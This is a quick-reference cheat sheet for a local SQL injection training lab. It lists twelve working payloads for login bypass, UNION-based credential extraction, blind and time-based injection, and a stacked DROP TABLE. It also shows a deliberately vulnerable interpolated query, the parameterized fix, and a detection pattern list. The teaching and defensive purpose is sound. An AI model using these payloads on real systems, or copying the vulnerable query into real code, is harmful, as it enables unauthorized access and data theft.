# 💉 SQL Injection Payloads - Quick Reference Cheat Sheet

A quick lookup guide for SQL injection test payloads used in the lab.

---

## ⚡ Copy-Paste Test Payloads

### 1. OR-Based Condition Bypass
```
Username: admin_demo' OR '1'='1
Password: anything
```
**Effect:** Makes WHERE clause always true - bypasses password check
**Works on:** Vulnerable endpoint ✅

---

### 2. SQL Comment Bypass
```
Username: admin_demo' --
Password: (leave blank or any value)
```
**Effect:** Comments out password check with SQL comment marker
**Works on:** Vulnerable endpoint ✅

---

### 3. Alternative Comment Syntax
```
Username: admin_demo' #
Password: (any)
```
**Effect:** Same as above but using # instead of --
**Works on:** Vulnerable endpoint ✅

---

### 4. Double Quote Bypass
```
Username: admin_demo" OR "1"="1
Password: anything
```
**Effect:** Same as #1 but with double quotes
**Works on:** Vulnerable endpoint ✅

---

### 5. Simple True Condition
```
Username: ' OR 'x'='x
Password: ' OR 'x'='x
```
**Effect:** Both fields evaluate to true
**Works on:** Vulnerable endpoint ✅

---

### 6. UNION SELECT Injection
```
Username: admin_demo' UNION SELECT 1,2,3 --
Password: anything
```
**Effect:** Combines SELECT statements to extract data
**Works on:** Vulnerable endpoint ⚠️ (may cause error)

---

### 7. Information Schema Attack
```
Username: ' UNION SELECT 1,username,password FROM lab_users --
Password: anything
```
**Effect:** Extracts actual usernames and passwords from database
**Works on:** Vulnerable endpoint ✅

---

### 8. Boolean-Based Blind SQLi
```
Username: admin_demo' AND '1'='1' --
Password: anything
```
**Effect:** Conditional logic for blind injection (responds differently for true/false)
**Works on:** Vulnerable endpoint ✅

---

### 9. FALSE Condition Test
```
Username: admin_demo' AND '1'='2' --
Password: anything
```
**Effect:** Makes condition false - should deny access
**Works on:** Vulnerable endpoint ✅

---

### 10. Stacked Query (Dangerous)
```
Username: admin_demo'; DROP TABLE lab_users; --
Password: anything
```
**Effect:** Attempts to execute multiple statements (may be blocked)
**Works on:** Vulnerable endpoint ⚠️ (unsafe - lab wrapped)

---

### 11. Time-Based Blind SQLi
```
Username: admin_demo' AND SLEEP(5) --
Password: anything
```
**Effect:** Causes 5-second delay if condition is true
**Works on:** Vulnerable endpoint ⚠️ (requires timing measurement)

---

### 12. User Enumeration
```
Username: ' OR '1'='1' LIMIT 1,1 --
Password: anything
```
**Effect:** Skips first record and returns second user
**Works on:** Vulnerable endpoint ✅

---

## 🔐 Valid Test Credentials

| Username | Password | Secret |
|----------|----------|--------|
| admin_demo | DemoPass123 | FLAG{sqli_demo_success_99182} |
| user_demo | UserPass456 | Welcome to the secure user area! |

---

## 🧪 Testing Methods

### Method 1: Web Interface
```
URL: http://localhost:3000/security-lab/sql-injection
1. Select "Vulnerable" or "Secure"
2. Copy payload to username field
3. Click Execute
4. Observe SQL and results
```

### Method 2: Terminal Script
```powershell
npm run test-payloads
# Runs all 12 tests automatically
```

### Method 3: Manual API Call (PowerShell)
```powershell
$body = @{
    username = "admin_demo' OR '1'='1"
    password = "anything"
} | ConvertTo-Json

Invoke-RestMethod -Method Post `
  -Uri "http://localhost:5000/api/security-lab/sql-injection/login-vulnerable" `
  -ContentType "application/json" `
  -Body $body
```

### Method 4: cURL
```bash
curl -X POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_demo'"'"' OR '"'"'1'"'"'='"'"'1","password":"anything"}'
```

---

## 🎯 Expected Results

### Vulnerable Endpoint Results

| Payload | Status | Result |
|---------|--------|--------|
| admin_demo / DemoPass123 | 200 | ✅ Success - valid creds |
| admin_demo' OR '1'='1 | 200 | ✅ Success - BYPASSED! |
| admin_demo' -- | 200 | ✅ Success - BYPASSED! |
| ' OR 'x'='x | 200 | ✅ Success - BYPASSED! |
| admin_demo' AND '1'='2' -- | 401 | ❌ Denied - condition false |
| invalid_user / anything | 401 | ❌ Denied - no match |

### Secure Endpoint Results

| Payload | Status | Result |
|---------|--------|--------|
| admin_demo / DemoPass123 | 200 | ✅ Success - valid creds |
| admin_demo' OR '1'='1 | 401 | ✅ Safe - rejected! |
| admin_demo' -- | 401 | ✅ Safe - rejected! |
| ' OR 'x'='x | 401 | ✅ Safe - rejected! |
| admin_demo' AND '1'='2' -- | 401 | ✅ Safe - rejected! |
| invalid_user / anything | 401 | ❌ Denied - no match |

---

## 🔍 Pattern Explanation

### Symbol Meanings

| Symbol | Meaning | Example |
|--------|---------|---------|
| `'` | String quote | `'username'` |
| `--` | SQL comment (everything after) | `'admin'--` |
| `#` | SQL comment (MySQL) | `'admin'#` |
| `/*` | Block comment start | `/*comment*/` |
| `*/` | Block comment end | `/*comment*/` |
| `OR` | Boolean OR operator | `'a' OR 'b'` |
| `AND` | Boolean AND operator | `'a' AND 'b'` |
| `;` | Query separator | `SELECT 1; DROP TABLE x;` |
| `UNION` | Combine SELECT results | `SELECT 1 UNION SELECT 2` |

---

## 📊 SQL Query Transformation

### Example: OR-Based Bypass

**Original Safe Query:**
```sql
SELECT * FROM lab_users WHERE username = 'admin_demo' AND password = 'DemoPass123'
```

**Vulnerable Code:**
```typescript
const sql = `SELECT * FROM lab_users WHERE username = '${username}' AND password = '${password}'`;
```

**Attacker Input:**
```
username = admin_demo' OR '1'='1
password = anything
```

**Resulting Query (VULNERABLE):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' OR '1'='1' AND password = 'anything'
```

**Analysis:**
- `OR '1'='1'` makes the condition always TRUE
- The `AND password = 'anything'` part doesn't matter
- First user in database is returned (usually admin)

---

## 🛡️ How Parameterized Queries Prevent This

**Secure Code:**
```typescript
const sql = 'SELECT * FROM lab_users WHERE username = ? AND password = ?';
await dbQuery(sql, [username, password]);
```

**Attacker Input:**
```
username = admin_demo' OR '1'='1
password = anything
```

**Database Receives:**
```
Query: SELECT * FROM lab_users WHERE username = ? AND password = ?
Param 1: admin_demo' OR '1'='1    (treated as TEXT, not SQL)
Param 2: anything
```

**Result:**
- Database looks for user with literal string: `admin_demo' OR '1'='1`
- No such user exists
- Access Denied ✅

---

## 🔬 Detection Patterns

The system detects these patterns:

```
- SQL comment markers: -- # /* */
- Stacked queries: ; SELECT, ; UPDATE, etc.
- UNION SELECT keyword
- Boolean conditions: OR 1=1, AND 1=1
- Suspicious functions: SLEEP(), BENCHMARK(), xp_cmdshell
- Information schema access: information_schema
- LOAD_FILE, DROP TABLE, ALTER TABLE, etc.
```

**Check:** [backend/src/utils/sqlInjectionDetector.ts](./backend/src/utils/sqlInjectionDetector.ts)

---

## 📝 Lab API Reference

### Vulnerable Endpoint
```
POST /api/security-lab/sql-injection/login-vulnerable
Content-Type: application/json

Request:
{
  "username": "test",
  "password": "test"
}

Response (200 - Success):
{
  "success": true,
  "message": "Access Granted! Demonstrating Vulnerability bypass.",
  "user": { "id": 1, "username": "admin_demo", "secret_note": "..." },
  "sql": "SELECT * FROM lab_users WHERE username = 'test' AND password = 'test'"
}

Response (401 - Failure):
{
  "success": false,
  "message": "Access Denied: Invalid credentials.",
  "sql": "SELECT * FROM lab_users WHERE username = 'test' AND password = 'test'"
}

Response (500 - Error):
{
  "success": false,
  "message": "Database query execution error",
  "error": "Error message from MySQL",
  "sql": "..."
}
```

### Secure Endpoint
```
POST /api/security-lab/sql-injection/login-secure
Content-Type: application/json

Request:
{
  "username": "test",
  "password": "test"
}

Response (200 - Success):
{
  "success": true,
  "message": "Access Granted! Authenticated using secure parameterized query.",
  "user": { "id": 1, "username": "admin_demo", "secret_note": "..." },
  "sql": "SELECT * FROM lab_users WHERE username = ? AND password = ? (Bind values: [\"test\",\"test\"])"
}

Response (401 - Failure):
{
  "success": false,
  "message": "Access Denied: Invalid credentials.",
  "sql": "SELECT * FROM lab_users WHERE username = ? AND password = ? (Bind values: [\"test\",\"test\"])"
}
```

---

## 💡 Tips & Tricks

### Testing Tips
- ✅ Start with valid credentials first to verify the system works
- ✅ Test one payload at a time
- ✅ Compare vulnerable vs secure side-by-side
- ✅ Pay attention to error messages - they reveal database info
- ✅ Use the web interface to see SQL queries in real-time

### Common Mistakes
- ❌ Forgetting quotes in payloads (e.g., missing `'`)
- ❌ Using wrong comment syntax for your database type
- ❌ Testing secure endpoint and wondering why it's "not vulnerable"
- ❌ Assuming stacked queries always work (depends on database)

### Advanced Techniques
- 🔬 Use SUBSTRING() to extract data character-by-character
- 🔬 Use IF() for conditional blind SQL injection
- 🔬 Use SLEEP() to detect true/false conditions by timing
- 🔬 Use CAST() to type conversion attacks
- 🔬 Use CONCAT() to combine multiple columns

---

## 🎓 Learning Checklist

- [ ] Understand OR-based bypass
- [ ] Understand comment-based bypass
- [ ] Understand UNION SELECT injection
- [ ] Know why parameterized queries are safe
- [ ] Can recognize SQL injection patterns
- [ ] Understand blind SQL injection concept
- [ ] Know multiple prevention methods
- [ ] Can test payloads using multiple methods

---

## 📖 File Locations

| File | Purpose |
|------|---------|
| `SQL_INJECTION_LAB_GUIDE.md` | Detailed technical guide |
| `SECURITY_LAB_TESTING_README.md` | Complete testing instructions |
| `SECURITY_LAB.md` | Detection system documentation |
| `test-payloads.js` | Automated test script |
| `backend/src/controllers/securityLab.controller.ts` | Vulnerable & Secure endpoints |
| `backend/src/utils/sqlInjectionDetector.ts` | Pattern detection logic |
| `frontend/app/security-lab/sql-injection/page.tsx` | Interactive web interface |

---

## 🚀 Quick Start Command

```bash
# From project root, run all tests
npm run test-payloads
```

---

## 📞 Troubleshooting

**Q: "Cannot reach backend"**  
A: Make sure backend is running: `cd backend && npm start`

**Q: "Database connection error"**  
A: Verify MySQL is running and cybersec_lab database exists

**Q: "Payload didn't work"**  
A: Double-check quotes and syntax. Review SQL generated in web UI.

**Q: "Secure endpoint still vulnerable"**  
A: It shouldn't be - parameterized queries are safe. Check you're using secure endpoint.

---

## ✨ This Lab Covers

- ✅ SQL Injection fundamentals
- ✅ Authentication bypass techniques
- ✅ Data extraction methods
- ✅ Detection & prevention
- ✅ Secure coding practices
- ✅ Vulnerability assessment
- ✅ Security logging

---

**Last Updated:** June 15, 2026  
**Status:** Ready for use - All endpoints tested and working
